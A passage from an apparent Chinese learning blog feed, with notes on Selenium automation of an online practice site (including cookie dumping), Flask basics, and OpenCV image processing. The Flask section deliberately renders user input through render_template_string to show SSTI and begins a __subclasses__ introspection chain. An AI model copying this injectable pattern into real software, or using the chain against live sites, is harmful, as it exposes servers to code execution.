punctuation">)</span>            time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.5</span><span class="token punctuation">)</span>    time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    diver<span class="token punctuation">.</span>find_element_by_link_text<span class="token punctuation">(</span><span class="token string">'提交练习'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>click<span class="token punctuation">(</span><span class="token punctuation">)</span>    time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    diver<span class="token punctuation">.</span>find_element_by_link_text<span class="token punctuation">(</span><span class="token string">'确定'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>click<span class="token punctuation">(</span><span class="token punctuation">)</span>    time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>获取cookie</p></blockquote><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> selenium <span class="token keyword">import</span> webdriver<span class="token keyword">import</span> timediver<span class="token operator">=</span>webdriver<span class="token punctuation">.</span>Chrome<span class="token punctuation">(</span>executable_path<span class="token operator">=</span><span class="token string">"D:\Chromdriver\chromedriver_win32\chromedriver2.exe"</span><span class="token punctuation">)</span>diver<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'http://www.faxuanyun.com'</span><span class="token punctuation">)</span>time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>diver<span class="token punctuation">.</span>find_element_by_id<span class="token punctuation">(</span><span class="token string">'userAccount'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>send_keys<span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span>diver<span class="token punctuation">.</span>find_element_by_id<span class="token punctuation">(</span><span class="token string">'userPassword'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>send_keys<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#diver.implicitly_wait(30)</span>time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span>diver<span class="token punctuation">.</span>find_element_by_class_name<span class="token punctuation">(</span><span class="token string">'loginBtn'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>click<span class="token punctuation">(</span><span class="token punctuation">)</span>time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>diver<span class="token punctuation">.</span>get_cookies<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>那末就大功告成了</p><blockquote><p>最终的效果呢</p></blockquote><blockquote><p>当你开启脚本后 你就可以干别的了 就节省了大量的时间<br>你可以启动后打游戏  死亡后 再 启动,就不用自己一直点一直点了<br>效果如下这里<br><img src="https://img-blog.csdnimg.cn/81f6ebabb8ec45a19208fbdcbdc5b682.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAUmd5bGlu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p></blockquote><p>还有很多方法 都忘了 以后再补充上</p>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Flask学习(待补充)</title>
      <link href="/2021/11/01/flask-xue-xi-dai-bu-chong/"/>
      <url>/2021/11/01/flask-xue-xi-dai-bu-chong/</url>
      
        <content type="html"><![CDATA[<h2 id="Flask框架的学习"><a href="#Flask框架的学习" class="headerlink" title="Flask框架的学习"></a>Flask框架的学习</h2><h3 id="获取用户的参数"><a href="#获取用户的参数" class="headerlink" title="获取用户的参数"></a>获取用户的参数</h3><p>这里利用route(‘要访问的路径名’)</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flaskapp<span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/rgylin/&lt;name>'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">hello_world</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span>  <span class="token string">'hello_world%s'</span><span class="token operator">%</span>name<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/rgylin/&lt;int:age>'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">hello_world1</span><span class="token punctuation">(</span>age<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span>  <span class="token string">'你的年龄%d'</span><span class="token operator">%</span>age<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>debug<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>这里会根据用户输入的变量类型自动判断</p></blockquote><p><img src="C:\Users\ASUS\Desktop\rgylin\web框架学习\QQ截图20211101191229.png" alt="QQ截图20211101191229"></p><h3 id="一个例子"><a href="#一个例子" class="headerlink" title="一个例子"></a>一个例子</h3><blockquote><p>以一个表单传递例子来说明</p></blockquote><p>首页制作为</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span>render_template<span class="token punctuation">,</span>requestapp<span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/register'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span>  render_template<span class="token punctuation">(</span><span class="token string">'register.html'</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/result'</span><span class="token punctuation">,</span>methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">,</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token comment">#设置提交方式get post</span><span class="token keyword">def</span> <span class="token function">result</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span>method<span class="token operator">==</span><span class="token string">'POST'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        result<span class="token operator">=</span>request<span class="token punctuation">.</span>form <span class="token comment">#获取</span>        <span class="token keyword">return</span>  render_template<span class="token punctuation">(</span><span class="token string">'result.html'</span><span class="token punctuation">,</span>result<span class="token operator">=</span>result<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>debug<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>访问register</p><p>会返回register.html的内容</p><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>Title<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://127.0.0.1:5000/result<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    名字:<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span>  <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>name<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    年龄<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span>   <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>age<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span>  <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>访问result 的路由</p><p>返回result.html的界面</p><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>Title<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>&#123;% for i,j in result.items() %&#125;   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span>&#123;&#123;i&#125;&#125;&#123;&#123;j&#125;&#125;<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>&#123;% endfor %&#125;<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>打印输出</p><h3 id="列出所有的url参数"><a href="#列出所有的url参数" class="headerlink" title="列出所有的url参数"></a>列出所有的url参数</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span>render_template<span class="token punctuation">,</span>requestapp<span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span>  request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>__str__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>debug<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>访问<a href="http://127.0.0.1:5000/?rgylin=nnihao">http://127.0.0.1:5000/?rgylin=nnihao</a></p><blockquote><p>返回:ImmutableMultiDict([(‘rgylin’, ‘nnihao’)])</p></blockquote><h3 id="获取某个指定的参数"><a href="#获取某个指定的参数" class="headerlink" title="获取某个指定的参数"></a>获取某个指定的参数</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span>  request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'rgylin'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>输入/?rgylin=nnihao</p><blockquote><p>返回nihao</p></blockquote><p>如果访问不存在的参数则会报错</p><p>解决代码</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'rgylin'</span><span class="token punctuation">)</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>r<span class="token operator">==</span><span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">'你输入的参数不对'</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> r<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h2><p>测试代码</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span>render_template_string<span class="token punctuation">,</span>requestapp<span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> temp<span class="token operator">=</span><span class="token triple-quoted-string string">'''    &lt;div> &lt;h3>%s&lt;/h3>    &lt;/div>    '''</span><span class="token operator">%</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span>  render_template_string<span class="token punctuation">(</span>temp<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>debug<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>输入1=4发现计算出来了 那么这里是可控的 存在ssti模板注入</p></blockquote><h3 id="类的学习"><a href="#类的学习" class="headerlink" title="类的学习"></a>类的学习</h3><blockquote><p>获取类的基类</p></blockquote><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">rgylin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>age<span class="token operator">=</span><span class="token number">12</span><span class="token keyword">print</span><span class="token punctuation">(</span>rgylin<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__base__<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>也可以写成这样</p><pre class="line-numbers language-none"><code class="language-none">print(&quot;&quot;.__class__.__bases__[0]) #获取字符串的基类<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>我们在获取其子类就行了</p><pre class="line-numbers language-none"><code class="language-none">print(&quot;&quot;.__class__.__bases__[0].__subclasses__())<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>通过调用globals可以获取到类内存在的方法、属性等值：</p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>OpnCV学习(二)</title>
      <link href="/2021/10/30/opncv-xue-xi-er/"/>
      <url>/2021/10/30/opncv-xue-xi-er/</url>
      
        <content type="html"><![CDATA[<h3 id="亮度对比度转换"><a href="#亮度对比度转换" class="headerlink" title="亮度对比度转换"></a>亮度对比度转换</h3><p> 1.可以对本图片对比亮暗度控制</p><p>2 两个图片叠加实现亮暗度处理</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span>  cv2 <span class="token keyword">as</span> cv<span class="token keyword">import</span> numpy <span class="token keyword">as</span> np<span class="token keyword">def</span> <span class="token function">convert_img</span><span class="token punctuation">(</span>img<span class="token punctuation">,</span>alpha<span class="token punctuation">,</span>gamma<span class="token punctuation">)</span><span class="token punctuation">:</span>    blank<span class="token operator">=</span> np<span class="token punctuation">.</span>zeros<span class="token punctuation">(</span>img<span class="token punctuation">.</span>shape<span class="token punctuation">,</span>img<span class="token punctuation">.</span>dtype<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>blank<span class="token punctuation">)</span>    <span class="token keyword">return</span> cv<span class="token punctuation">.</span>addWeighted<span class="token punctuation">(</span>img<span class="token punctuation">,</span>alpha<span class="token punctuation">,</span>blank<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>gamma<span class="token punctuation">)</span><span class="token comment">#           参数1 图片对象1  参数2 图片1 权重   参数 3  图片2 参数4 图片2 权重 参数5 常量</span><span class="token comment">#           满足 img1*alpha+img2*beta+gamma</span>img<span class="token operator">=</span> cv<span class="token punctuation">.</span>imread<span class="token punctuation">(</span><span class="token string">'demo.png'</span><span class="token punctuation">)</span>cv<span class="token punctuation">.</span>imwrite<span class="token punctuation">(</span><span class="token string">'rgylin3.png'</span><span class="token punctuation">,</span>convert_img<span class="token punctuation">(</span>img<span class="token punctuation">,</span><span class="token number">0.4</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="图像大小转换"><a href="#图像大小转换" class="headerlink" title="图像大小转换"></a>图像大小转换</h3><blockquote><p>resize()函数提供了指定插值算法的函数</p><p>缩放时:使用interpolation=cv2.INTER_AREA</p><p>放大时:使用interploation =cv2.INTER_CUBIC</p><p>默认:interploation=cv2.INTER_LINEAR</p></blockquote><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">resize</span><span class="token punctuation">(</span>img<span class="token punctuation">)</span><span class="token punctuation">:</span>    new_img<span class="token operator">=</span> cv<span class="token punctuation">.</span>resize<span class="token punctuation">(</span>img<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">,</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">,</span>interpolation<span class="token operator">=</span>cv<span class="token punctuation">.</span>INTER_AREA<span class="token punctuation">)</span>    <span class="token comment">#或者 new_img=cv.resize(img,none,fx=0.5,fy=0.6,interpolation=INSET_AREA)</span>    <span class="token comment">#这里fx fy我理解的是放缩比</span>    cv<span class="token punctuation">.</span>imshow<span class="token punctuation">(</span><span class="token string">'rgylin_resize'</span><span class="token punctuation">,</span>new_img<span class="token punctuation">)</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>cv<span class="token punctuation">.</span>waitKey<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        cv<span class="token punctuation">.</span>destroyAllWindows<span class="token punctuation">(</span><span class="token punctuation">)</span>img<span class="token operator">=</span> cv<span class="token punctuation">.</span>imread<span class="token punctuation">(</span><span class="token string">'demo.png'</span><span class="token punctuation">)</span>resize<span class="token punctuation">(</span>img<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="图像的噪声处理"><a href="#图像的噪声处理" class="headerlink" title="图像的噪声处理"></a>图像的噪声处理</h3><blockquote><p>添加噪声可以起到训练效果更好的效果</p><p>这里有两个方法</p><ul><li>一是添加淑盐噪声</li><li>二是添加高斯随机噪声</li></ul></blockquote><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">salt_noise</span><span class="token punctuation">(</span>img<span class="token punctuation">,</span>percentage<span class="token punctuation">)</span><span class="token punctuation">:</span>    rows<span class="token punctuation">,</span>cols<span class="token punctuation">,</span>tongdao<span class="token operator">=</span> img<span class="token punctuation">.</span>shape    all_num<span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>percentage<span class="token operator">*</span>rows<span class="token operator">*</span>cols<span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>all_num<span class="token punctuation">)</span><span class="token punctuation">:</span>        x<span class="token operator">=</span> random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>rows<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment">#这个函数包含rows-1 所以不能超过这个范围</span>        y<span class="token operator">=</span> random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>cols<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment">#随机数</span>            img<span class="token punctuation">[</span>x<span class="token punctuation">,</span>y<span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            img<span class="token punctuation">[</span>x<span class="token punctuation">,</span>y<span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">255</span>    cv<span class="token punctuation">.</span>imshow<span class="token punctuation">(</span><span class="token string">'salt_img'</span><span class="token punctuation">,</span>img<span class="token punctuation">)</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>cv<span class="token punctuation">.</span>waitKey<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        cv<span class="token punctuation">.</span>destroyAllWindows<span class="token punctuation">(</span><span class="token punctuation">)</span>img<span class="token operator">=</span> cv<span class="token punctuation">.</span>imread<span class="token punctuation">(</span><span class="token string">'demo.png'</span><span class="token punctuation">)</span>salt_noise<span class="token punctuation">(</span>img<span class="token punctuation">,</span><span class="token number">0.4</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>高斯</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">gaosi_noise</span><span class="token punctuation">(</span>img<span class="token punctuation">,</span>mu<span class="token punctuation">,</span>siga<span class="token punctuation">,</span>k<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment">#mu代表随机数高斯分布的平均值 siga代表随机数高斯分布的标准差,k代表高斯噪声的强度</span>    rows<span class="token punctuation">,</span>cols<span class="token operator">=</span>img<span class="token punctuation">.</span>shape    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>rows<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>cols<span class="token punctuation">)</span><span class="token punctuation">:</span>            value<span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>img<span class="token punctuation">[</span>i<span class="token punctuation">,</span>j<span class="token punctuation">]</span><span class="token operator">+</span>k<span class="token operator">*</span>random<span class="token punctuation">.</span>gauss<span class="token punctuation">(</span>mu<span class="token operator">=</span>mu<span class="token punctuation">,</span>sigma<span class="token operator">=</span>siga<span class="token punctuation">)</span><span class="token punctuation">)</span>            value<span class="token operator">=</span> np<span class="token punctuation">.</span>clip<span class="token punctuation">(</span>a_max<span class="token operator">=</span><span class="token number">255</span><span class="token punctuation">,</span>a_min<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>a<span class="token operator">=</span>value<span class="token punctuation">)</span><span class="token comment">#产生0到255 的数不让它过界</span>            img<span class="token punctuation">[</span>i<span class="token punctuation">,</span>j<span class="token punctuation">]</span><span class="token operator">=</span>value    cv<span class="token punctuation">.</span>imshow<span class="token punctuation">(</span><span class="token string">'nihao'</span><span class="token punctuation">,</span>img<span class="token punctuation">)</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>cv<span class="token punctuation">.</span>waitKey<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token builtin">ord</span><span class="token 